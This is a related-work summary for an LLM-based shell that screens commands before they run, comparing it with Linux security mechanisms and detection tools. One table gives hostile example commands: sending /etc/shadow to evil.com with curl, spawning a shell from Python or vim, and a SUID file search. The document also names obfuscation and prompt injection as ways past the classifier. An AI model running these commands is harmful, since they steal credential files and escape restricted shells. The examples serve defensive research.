# aegish Related Work: Comprehensive Summary

**Date**: 2026-02-09

This document summarizes the complete related work analysis for aegish, an LLM-powered shell that validates every command before execution. The full analysis is spread across four detailed documents; this summary provides an overview, key tables, and the synthesis needed for a Related Work section.

---

## Document Index

| File | Topic | Tools/Projects Covered |
|---|---|---|
| [01-linux-security-mechanisms.md](./01-linux-security-mechanisms.md) | Standard Linux security tools | AppArmor, SELinux, seccomp, namespaces/cgroups, chroot, rbash, sudo, auditd, Firejail, Bubblewrap, grsecurity/PaX, iptables/nftables, Linux capabilities |
| [02-ai-llm-security-tools.md](./02-ai-llm-security-tools.md) | AI/LLM-powered security tools | Claude Code, Copilot CLI, Amazon Q, Open Interpreter, ShellGPT, Warp, Nushell, E2B, NeMo Guardrails, Security Copilot, Charlotte AI, sudo_pair, ShellCheck |
| [03-threat-databases-and-detection.md](./03-threat-databases-and-detection.md) | Threat databases and detection frameworks | GTFOBins, LOLBAS, LOLDrivers, MITRE ATT&CK, Atomic Red Team, Sigma, YARA, Falco, osquery, Schonlau dataset, NL2Bash, OTRF/Mordor |
| [04-shell-sandboxing-and-pam.md](./04-shell-sandboxing-and-pam.md) | Shell sandboxing and access management | lshell, GNU Rush, rssh, Teleport, Boundary, StrongDM, PAM, polkit, SSH forced commands, Docker, nsjail, Systrace, Janus, CyberArk, BeyondTrust, Delinea, Lynis, CIS Benchmarks, OpenSnitch |
| [05-ids-anomaly-detection-academic.md](./05-ids-anomaly-detection-academic.md) | IDS, anomaly detection, academic ML security | OSSEC/Wazuh, Samhain/AIDE/Tripwire, ML-IDS, syscall analysis (Forrest et al.), UEBA, LLMs for cybersecurity, prompt injection, zero-shot classification, XAI for security, EDR (CrowdStrike, SentinelOne) |

**Total coverage**: 60+ tools, projects, frameworks, and research areas.

---

## Taxonomy of Related Work

### By Relationship to aegish

**Category 1: Directly Comparable** (LLM + command + security)
- No known open-source project combining LLM analysis with pre-execution shell command blocking has been identified.

**Category 2: Same Problem, Different Approach** (command safety without LLM)
- Restricted shells (rbash, lshell, GNU Rush, rssh)
- Command whitelisting (SSH forced commands, sudo restrictions)
- Commercial PAM command filtering (CyberArk, BeyondTrust, Delinea)
- Static analysis (ShellCheck, Shellharden)
- Single-purpose wrappers (safe-rm, Molly-Guard, trash-cli)

**Category 3: Same Approach, Different Problem** (LLM for security, not commands)
- Enterprise AI Security Copilots (MS Security Copilot, Charlotte AI, Purple AI)
- LLM-powered security tools (SecGPT, PentestGPT, VirusTotal Code Insight)
- AI coding assistants (Claude Code, Copilot CLI, Amazon Q)

**Category 4: Complementary -- Different Layer** (kernel/system-level enforcement)
- MAC systems (AppArmor, SELinux)
- System call filtering (seccomp-bpf)
- Container isolation (namespaces, cgroups, Docker, nsjail, Firejail, Bubblewrap)
- Network filtering (iptables/nftables)
- Kernel hardening (grsecurity/PaX, Linux capabilities)
- Filesystem isolation (chroot)

**Category 5: Complementary -- Different Timing** (post-execution detection)
- HIDS (OSSEC, Wazuh, Samhain, AIDE, Tripwire)
- Runtime security (Falco, Tetragon, Tracee)
- EDR (CrowdStrike Falcon, SentinelOne, Defender for Endpoint)
- Audit and monitoring (auditd, osquery, Sysmon for Linux)
- SIEM rules (Sigma, YARA)
- UEBA systems (Exabeam, Splunk UBA)

**Category 6: Threat Intelligence and Benchmarks**
- GTFOBins, LOLBAS, LOLDrivers
- MITRE ATT&CK
- Atomic Red Team
- Security datasets (Schonlau, ADFA-LD, NL2Bash, OTRF/Mordor)

**Category 7: LLM Safety and Adversarial Robustness**
- Prompt injection research (Greshake et al., HackAPrompt, OWASP LLM Top 10)
- Guardrails (NeMo Guardrails, Guardrails AI, LlamaGuard)
- Agent sandboxing (E2B, LangChain Tool Safety)

---

## Master Comparison Matrix

### Approach Comparison

| System | Detection Method | Timing | Layer | Requires Training | Explains Decisions |
|---|---|---|---|---|---|
| **aegish** | **LLM semantic analysis** | **Pre-execution** | **Shell (user-space)** | **No (zero-shot)** | **Yes (NL)** |
| AppArmor / SELinux | Path/label-based MAC policy | During execution | Kernel (LSM) | N/A (policy-based) | No |
| seccomp-bpf | BPF system call filtering | During execution | Kernel (syscall) | N/A (filter-based) | No |
| rbash / lshell | Syntax restrictions / allowlist | During execution | Shell (user-space) | N/A (config-based) | No |
| sudo | User + command authorization | Pre-execution (auth) | User-space | N/A (config-based) | No |
| Sigma / YARA | Pattern matching rules | Post-execution | Log analysis | N/A (rule-based) | Rule IDs only |
| Falco / Tetragon | eBPF rule-based syscall analysis | Runtime | Kernel (eBPF) | N/A (rule-based) | Rule descriptions |
| OSSEC / Wazuh | Rule-based log correlation | Post-execution | Agent + server | N/A (rule-based) | Rule descriptions |
| EDR (CrowdStrike, S1) | ML behavioral analysis + cloud AI | Pre-exec + runtime | Kernel-mode agent | Yes (millions of samples) | ATT&CK mapping |
| ML-IDS (academic) | Supervised ML classifiers | Post-execution | Varies | Yes (labeled datasets) | No (black-box) |
| UEBA | Statistical anomaly on behavior | Post-execution | Analytics platform | Yes (baseline learning) | Risk scores |
| Security Copilot | LLM analysis of security data | Post-incident | Cloud (analyst tool) | No (zero-shot) | Yes (NL) |
| CyberArk / BeyondTrust | Regex command filtering | Pre-execution | Gateway (enterprise) | N/A (regex-based) | No |
| ShellCheck | Static analysis rules | Pre-execution (lint) | Script analysis | N/A (rule-based) | Rule codes |

### Threat Coverage by Category

| Threat Type | aegish | Kernel MAC | seccomp | rbash | Sigma | Falco | EDR | HIDS |
|---|---|---|---|---|---|---|---|---|
| Reverse shells | **Block\*** | Partial | No | No | Detect | Detect | Detect+Block | Detect |
| Shell escapes (GTFOBins) | **Block\*** | No | No | Partial | Detect | Detect | Detect+Block | No |
| Privilege escalation | **Block\*** | Partial | Partial | No | Detect | Detect | Detect+Block | Detect |
| Data exfiltration | **Block\*** | No | No | No | Detect | Partial | Detect+Block | No |
| System file modification | **Block\*** | Partial | Partial | Partial | Detect | Detect | Detect+Block | Detect |
| Fork bombs | **Block\*** | No | Partial | No | No | Detect | Partial | No |
| Malware download+exec | **Block\*** | Partial | No | Partial | Detect | Detect | Detect+Block | Detect |
| Container escapes | **Block\*** | Partial | Partial | No | Detect | Detect | Detect+Block | No |

**Key**: "Block" = prevents before execution; "Detect" = identifies after/during execution; "Partial" = works only under specific configurations; "No" = does not address. \*aegish's blocking accuracy varies by model and category -- benchmark results show 60-100% detection rates depending on model and GTFOBins category. The "command" category is the hardest (~61% avg across models).

---

## The Semantic Intent Gap

The fundamental insight motivating aegish: **every existing Linux security mechanism operates on mechanisms (system calls, file paths, labels, packets) rather than intent.**

### Illustration: Same Mechanism, Different Intent

| Command Pair | Same Binary | Same Syscalls | Same SELinux Type | Same AppArmor Profile | aegish Distinguishes? |
|---|---|---|---|---|---|
| `curl https://api.github.com` vs. `curl -d @/etc/shadow http://evil.com` | Yes | Yes | Yes | Yes | **Yes\*** |
| `find ~/docs -name '*.pdf'` vs. `find / -perm -4000 -type f` | Yes | Yes | Yes | Yes | **Yes\*** |
| `tar czf backup.tar.gz ~/docs` vs. `tar czf - /etc/shadow \| base64 \| curl -d @- http://evil.com` | Yes (tar) | Yes | Yes | Yes | **Yes\*** |
| `python3 script.py` vs. `python3 -c 'import pty; pty.spawn("/bin/sh")'` | Yes | Yes | Yes | Yes | **Yes\*** |
| `vim document.txt` vs. `vim -c ':!/bin/bash'` | Yes | Yes | Yes | Yes | **Yes\*** |

\*aegish's ability to distinguish depends on the LLM model used; benchmark results show high but not perfect accuracy across models and categories.

No kernel-level mechanism can make these distinctions because the system calls, binary names, file paths, and security labels are identical. The difference exists only at the semantic/intent level, which is where aegish operates.

---

## aegish's Unique Position: The Five-Property Differentiator

No existing system -- academic, open-source, or commercial -- combines all five properties:

| Property | aegish | Next Best Alternative | Gap |
|---|---|---|---|
| **1. Pre-execution enforcement** | Yes | SELinux/AppArmor | These have no semantic understanding |
| **2. Semantic understanding** | Yes (LLM) | EDR behavioral AI | EDR is post-execution |
| **3. Zero-shot (no training data)** | Yes | None | All ML-IDS require labeled training data |
| **4. Natural language explanations** | Yes | Security Copilot | Copilot is post-incident, not enforcement |
| **5. No kernel access required** | Yes | ShellCheck | ShellCheck has no semantic understanding |

---

## Defense-in-Depth Architecture

```
+----------------------------------------------------------+
|  Layer 6: SEMANTIC / INTENT (aegish)                     |
|  "What does this command MEAN? Is the intent malicious?"  |
|  Pre-execution, LLM-based classification                  |
+----------------------------------------------------------+
|  Layer 5: AUTHENTICATION / AUTHORIZATION (sudo, PAM)     |
|  "Is this user allowed to run this?"                      |
+----------------------------------------------------------+
|  Layer 4: SHELL RESTRICTIONS (rbash, lshell)              |
|  "Is this shell syntax permitted?"                        |
+----------------------------------------------------------+
|  Layer 3: SANDBOX / ISOLATION (Firejail, bwrap, Docker)  |
|  "What resources can this process see?"                   |
+----------------------------------------------------------+
|  Layer 2: MAC / ACCESS CONTROL (AppArmor, SELinux, caps) |
|  "What operations may this process perform?"              |
+----------------------------------------------------------+
|  Layer 1: SYSCALL / KERNEL (seccomp, grsecurity)         |
|  "What kernel interfaces can this process use?"           |
+----------------------------------------------------------+
|  Layer 0: NETWORK (iptables/nftables)                     |
|  "What packets may enter or leave?"                       |
+----------------------------------------------------------+
|  DETECTION (auditd, Falco, EDR, HIDS, SIEM)              |
|  "What happened?" (cross-cutting forensics)               |
+----------------------------------------------------------+
```

**Without aegish**: Threats that use only permitted mechanisms (same binaries, same syscalls, same file paths) can execute semantically malicious operations freely.

**Without kernel mechanisms**: aegish's classifier might be bypassed by obfuscated or novel commands. Without kernel enforcement, a missed classification results in unrestricted execution.

**With both**: Threats must bypass both semantic analysis AND runtime enforcement -- fundamentally different analysis approaches making simultaneous bypass extremely difficult.

---

## Open Challenges

1. **Adversarial robustness**: Command obfuscation (base64 encoding, variable substitution, backtick expansion) could bypass LLM analysis.
2. **Prompt injection**: Crafted commands might manipulate the LLM's classification through embedded instructions.
3. **Latency**: 100ms-2s per API call. Hybrid approaches (fast regex pre-filter + LLM for ambiguous cases) could mitigate.
4. **Determinism**: LLMs may classify the same command differently across runs. Low temperature settings mitigate but don't eliminate this.
5. **Context awareness**: Currently stateless (per-command). Session context could improve multi-step attack detection.
6. **Local inference**: Small models (7B-13B) could enable on-device deployment, removing API dependency and reducing latency.

---

## Key References

### Directly Related
- GTFOBins: https://gtfobins.github.io/
- LOLBAS: https://lolbas-project.github.io/
- MITRE ATT&CK T1059: https://attack.mitre.org/techniques/T1059/

### Linux Security
- AppArmor: https://apparmor.net/
- SELinux: https://selinuxproject.org/
- seccomp: https://www.kernel.org/doc/html/latest/userspace-api/seccomp_filter.html
- Falco: https://falco.org/
- Firejail: https://firejail.wordpress.com/

### Academic
- Forrest et al. (1996), "A Sense of Self for Unix Processes" (IEEE S&P)
- Schonlau et al. (2001), Masquerade Detection Dataset
- Lin et al. (2018), "NL2Bash" (arXiv:1802.08979)
- DeepLog (Du et al., CCS 2017)
- Kheddar (2024), "Transformers and Large Language Models for Efficient Intrusion Detection Systems: A Comprehensive Survey" (arXiv:2408.07583)
- "When LLMs Meet Cybersecurity" (2024, arXiv:2405.03644)

### LLM Security
- Greshake et al. (2023), "Indirect Prompt Injection" (arXiv:2302.12173)
- OWASP Top 10 for LLM Applications (2025): https://genai.owasp.org/llm-top-10/
- NeMo Guardrails: https://github.com/NVIDIA/NeMo-Guardrails

### Commercial PAM
- CyberArk: https://www.cyberark.com/
- BeyondTrust: https://www.beyondtrust.com/

### EDR
- CrowdStrike Falcon: https://www.crowdstrike.com/platform/
- SentinelOne Singularity: https://www.sentinelone.com/platform/
